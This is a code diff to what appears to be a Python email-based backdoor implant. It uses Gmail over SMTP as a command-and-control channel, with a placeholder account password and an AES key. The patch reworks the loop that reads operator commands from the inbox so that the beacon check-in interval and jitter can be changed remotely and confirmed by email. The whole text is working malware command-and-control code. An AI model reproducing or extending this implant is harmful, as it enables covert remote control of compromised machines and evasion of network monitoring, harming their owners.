@@ -75,7 +75,7 @@ gmail_pwd = '!y0ur_p@ssw0rd!'
 server = "smtp.gmail.com"
 server_port = 587
 AESKey = 'my_AES_key'
-EMAIL_KNOCK_TIMEOUT = 60 #seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
 JITTER = 100
 TAG = 'RELEASE'
 VERSION = '1.0.0'
@@ -745,32 +745,39 @@ class restart(threading.Thread):
 
 class jitter(threading.Thread ):
 
-    def __init__(self, jobid):
+    def __init__(self, command, jobid):
         threading.Thread.__init__(self)
+        self.command = command
         self.jobid = jobid
         self.daemon = True
         self.start()
 
     def run(self):
         try:
-            sendEmail({'cmd': 'jitter', 'res': 'Success'}, jobid=self.jobid)
-            time.sleep(3)
+            global JITTER
+            JITTER = self.command
+            sendEmail({'cmd': 'jitter', 'res': 'Success with Changing Jitter too %s Seconds' %str(JITTER)}, jobid=self.jobid)
+
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
 
 class email_check(threading.Thread ):
 
-    def __init__(self, jobid):
+    def __init__(self, command, jobid):
         threading.Thread.__init__(self)
+        self.command = command
         self.jobid = jobid
         self.daemon = True
         self.start()
 
     def run(self):
         try:
-            sendEmail({'cmd': 'email_check, 'res': 'Success'}, jobid=self.jobid)
+            global EMAIL_KNOCK_TIMEOUT
+            EMAIL_KNOCK_TIMEOUT = self.command
+            sendEmail({'cmd': 'email_check', 'res': 'Success with changing Email Check in time too %s Seconds' %str(EMAIL_KNOCK_TIMEOUT)}, jobid=self.jobid)
             time.sleep(3)
+
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
@@ -989,7 +996,8 @@ class sendEmail(threading.Thread):
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
-
+    #EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+    #JITTER = 100
     while True:
 
         try:
@@ -1071,13 +1079,17 @@ def checkJobs():
                     elif cmd == 'forcecheckin':
                         sendEmail("Host checking in as requested", checkin=True)
 
-                    elif cmd == 'forcecheckin':
-                        email_check(jobid)
-                        EMAIL_KNOCK_TIMEOUT = int(arg)
+                    elif cmd == 'email_check':
+                        email_check(arg, jobid)
+                        #EMAIL_KNOCK_TIMEOUT = int(arg)
+                        sendEmail("Email Checking changed too: %s seconds" % str(arg), checkin=True)
 
                     elif cmd == 'jitter':
-                        jitter(jobid)
-                        JITTER = int(arg)
+
+                        jitter(arg, jobid)
+                        #JITTER = int(arg)
+                        sendEmail("JITTER UPDATED too: %s seconds" % str(arg), checkin=True)
+
 
                     else:
                         raise NotImplementedError
